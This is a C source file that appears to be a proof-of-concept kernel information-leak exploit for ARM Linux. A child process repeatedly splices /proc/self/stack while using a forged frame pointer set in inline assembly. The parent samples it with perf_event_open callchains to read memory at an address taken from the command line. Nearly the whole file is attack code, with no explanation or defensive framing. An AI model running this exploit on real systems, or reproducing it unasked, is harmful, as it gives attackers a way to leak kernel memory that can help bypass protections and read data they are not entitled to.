#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <inttypes.h>
#include <assert.h>
#include <errno.h>
#include <time.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>

#include <linux/perf_event.h>

struct my_event {
	struct perf_event_header header;
	uint64_t   nr;
	uint64_t   ips[/*nr*/];
};

long perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
	return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

int main(int argc, char **argv) {
	int status;
	if (argc != 2) {
		puts("args: targetaddr");
		return 1;
	}
	unsigned long target = strtoul(argv[1], NULL, 0);
	printf("attempting to leak 0x%08lx\n", target);
	unsigned long fake_stackframe[3] = { target + 4, 0xdeadbeef, 0x13371337 }; /*fp,sp,lr*/
	printf("fake stackframe: fp=%p\n", (char*)fake_stackframe+sizeof(fake_stackframe));
	pid_t child = fork();
	if (child == -1)
		err(1, "fork");
	if (child == 0) {
		sleep(1); /* quick-and-dirty way to wait for the parent to attach */

		int fd = open("/proc/self/stack", O_RDONLY);
		if (fd == -1)
			err(1, "unable to open stack");
		int pipefds[2];
		if (pipe(pipefds))
			err(1, "pipe");
		for (int i=0; i<100; i++) {
			// `splice(fd, NULL, pipefds[1], NULL, 255, 0);` with fake framepointer
			asm volatile(
				"mov r7, #340\n" /* splice */
				"mov r0, %[fd]\n"
				"mov r1, #0\n"
				"mov r2, %[pipewriteend]\n"
				"mov r3, #0\n"
				"mov r4, #255\n"
				"mov r5, #0\n"
				"mov r6, r11\n"
				"mov r11, %[fakeframeptr]\n"
				"svc #0\n"
				"mov r11, r6\n"
				: /*output*/
				: [fd] "r" (fd), [pipewriteend] "r" (pipefds[1]), [fakeframeptr] "r" ((char*)fake_stackframe + sizeof(fake_stackframe))
				: "r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "memory"
			);
		}
		return 0;
	}
	struct perf_event_attr attr = {
		.type = PERF_TYPE_HARDWARE,
		.config = PERF_COUNT_HW_INSTRUCTIONS,
		.size = sizeof(struct perf_event_attr),
		.sample_period = 100000,
		.sample_type = PERF_SAMPLE_CALLCHAIN,
		.precise_ip = 2,
		.exclude_callchain_kernel = 1
	};
	int perf_fd = perf_event_open(&attr, child, -1, -1, 0);
	if (perf_fd == -1)
		err(1, "perf_event_open");
	struct perf_event_mmap_page *meta_page = mmap(NULL, 2*4096, PROT_READ|PROT_WRITE, MAP_SHARED, perf_fd, 0);
	if (meta_page == MAP_FAILED)
		err(1, "mmap");

	if (waitpid(child, &status, 0) != child)
		err(1, "waitpid");

	uint64_t data_head = meta_page->data_head;
	if (data_head == 0) {
		puts("no data!");
		return 0;
	}

	printf("data_head is at %lx\n", (unsigned long)data_head);
	struct perf_event_header *head = (void*)((char*)meta_page + 4096);
	while ((char*)head + head->size < (char*)meta_page + 4096 + data_head) {
		if (head->type == PERF_RECORD_SAMPLE) {
			struct my_event *ev = (void*)head;
			if (ev->nr >= 4 && ev->ips[2] == 0x13371337) {
				printf("SUCCESS: 0x%08lx\n", (unsigned long)ev->ips[3]);
			}
		}
		head = (void*)((char*)head + head->size);
	}
	return 0;
}
